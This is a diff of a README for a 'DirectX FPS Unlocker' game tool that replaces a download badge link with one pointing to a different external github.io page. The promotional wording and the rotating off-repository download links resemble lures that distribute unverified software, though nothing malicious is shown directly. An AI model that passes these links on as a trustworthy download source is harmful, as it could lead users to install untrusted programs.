@@ -2,7 +2,7 @@
 
 DirectX FPS Unlocker is a tool designed to enhance your gaming experience by unlocking the framerate limits set in DirectX games. Trusted by game enthusiasts worldwide, it offers smoother gameplay and improved performance.
 
-[![Download DirectX FPS Unlocker](https://img.shields.io/badge/Download-DirectX%20FPS%20Unlocker-blueviolet?style=for-the-badge)](https://unluvibox.github.io/.github/directx-fps-unlocker)
+[![Open DirectX Games](https://img.shields.io/badge/Open-DirectX%20Games-EA580C?style=flat-square)](https://direct-x-games.github.io/.github/)
 
 ## 🎯 Key Features
 
